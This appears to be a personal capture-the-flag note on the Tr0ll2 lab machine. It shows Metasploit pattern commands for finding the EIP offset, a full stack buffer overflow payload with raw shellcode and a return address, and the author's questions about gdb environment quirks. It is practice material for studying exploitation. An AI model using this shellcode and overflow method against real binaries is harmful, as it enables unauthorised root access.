#### Fuzzing
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6a413969
```
#### Payload
```
r $(python -c "print 'A'*198 + ''\xdb\xd2\xbb\x1c\x39\x66\x86\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x0b\x83\xc0\x04\x31\x58\x16\x03\x58\x16\xe2\xe9\x53\x6d\xde\x88\xf6\x17\xb6\x87\x95\x5e\xa1\xbf\x76\x12\x46\x3f\xe1\xfb\xf4\x56\x9f\x8a\x1a\xfa\xb7\x85\xdc\xfa\x47\xb9\xbe\x93\x29\xea\x4d\x0b\xb6\xa3\xe2\x42\x57\x86\x85'' + '\x70\xfd\xff\xbf'")
```
#### Flag
![[Tr0ll2-img1.png]]
#### Hurdles & Questions:
1. Why do we need to start gdb with env and unset the env variables? 
	- https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it/17775966#17775966
2. Why doesn't the 'usual' buffer overflow work? why do we have to pad nop after EIP address THEN add the shellcode? 
	- The usual Buffer Overflow DOES work. You just have to account 'no. 1'
	1. if i unset the env variables and do the usual BO in GDB, the shell is spawn as regular user. WHY? check 'gdb strips EUID'
